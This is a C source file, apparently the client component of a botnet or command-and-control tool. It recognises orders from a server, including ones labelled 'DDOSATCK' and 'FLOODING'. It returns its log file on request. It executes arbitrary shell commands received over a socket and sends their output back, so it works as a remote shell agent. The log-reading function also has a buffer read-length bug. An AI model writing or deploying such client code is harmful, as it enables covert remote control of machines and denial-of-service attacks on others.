#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

#include "../../include/client/client_utils.h"
#include "../../include/logging.h"
#include "../../include/send_message.h"
#include "../../include/receive_message.h"
#include "../../include/commands.h"

// Check the 8 first characters of the buffer to check the order type
enum OrderType get_order_enum_type(const char *buffer) {
    char flag[9];
    strncpy(flag, buffer, 8); // Copy the first 8 characters
    flag[8] = '\0'; // Null-terminate the string

    if (strcmp(flag, "COMMAND_") == 0) return COMMAND_;
    if (strcmp(flag, "ASKLOGS_") == 0) return ASKLOGS_;
    if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
    if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
    if (strcmp(flag, "FLOODING") == 0) return FLOODING;
    return UNKNOWN;
}

// Return a buffer storing the n_last_line lines of the main.log file or all of the lines if n_last_line <= 0
char* read_client_log_file(int n_last_line) {
    FILE *file = fopen("main.log", "r");
    if (!file) {
        perror("Error while opening log file");
        return NULL;
    }

    char *buffer;

    if(n_last_line <= 0) {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file); // Cursor position, get file byte size
        fseek(file, 0, SEEK_SET);

        buffer = malloc(filesize + 1);
        size_t read_size = fread(buffer, 1, filesize, file); // read all the file
        buffer[read_size] = '\0';
    }
    else {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file);
        long pos = filesize - 1; // begin at the end of the file before \0
        int newline_count = 0;

        // getting the cursor position to begin reading the n_last_line lines of the file
        while (pos >= 0 && newline_count <= n_last_line) {
            fseek(file, pos, SEEK_SET);
            int c = fgetc(file);
            if (c == '\n') {
                newline_count++;
            }
            pos--;
        }
        long start_pos = pos + 1;
        fseek(file, start_pos, SEEK_SET);

        buffer = malloc(filesize + 1);
        long read_size = filesize - start_pos;
        fread(buffer, 1, filesize, file);
        buffer[read_size] = '\0';
    }

    fclose(file);
    return buffer;
}

int parse_and_execute_command(const char *raw_message, int sockfd) {
    Command cmd;
    deserialize_command((char *)raw_message, &cmd);

    // Check if the command is a `cd` command
    if (strcmp(cmd.program, "cd") == 0) {
        if (cmd.params && cmd.params[0]) {
            // Change the working directory
            if (chdir(cmd.params[0]) == 0) {
                send_message(sockfd, "Directory changed successfully");
            } else {
                send_message(sockfd, "Failed to change directory");
            }
        } else {
            send_message(sockfd, "No directory specified");
        }

        free_command(&cmd); // Properly free the Command structure
        return 0; // No further processing needed
    }

    // Check if the command is a `pwd` command
    if (strcmp(cmd.program, "pwd") == 0) {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            send_message(sockfd, cwd); // Send the current working directory back to the server
        } else {
            send_message(sockfd, "Error retrieving cwd");
        }

        free_command(&cmd); // Properly free the Command structure
        return 0; // No further processing needed
    }

    // Execute other commands
    char result_buffer[4096] = {0};
    int exit_code = execute_command(&cmd, result_buffer, sizeof(result_buffer));

    // Send the result back to the server
    if (exit_code >= 0) {
        send_message(sockfd, result_buffer);
    } else {
        send_message(sockfd, "Command execution failed");
    }

    free_command(&cmd); // Properly free the Command structure
    return exit_code;
}

void receive_and_process_message(int sockfd) {
    char buffer[1024];

    // Receive the message from the server
    if (receive_message_client(sockfd, buffer, sizeof(buffer)) < 0) {
        output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
        return;
    }

    output_log("Done receiving, preparing to parse and execute\n", LOG_DEBUG, LOG_TO_CONSOLE);

    // Parse and execute the command
    parse_and_execute_command(buffer, sockfd);
}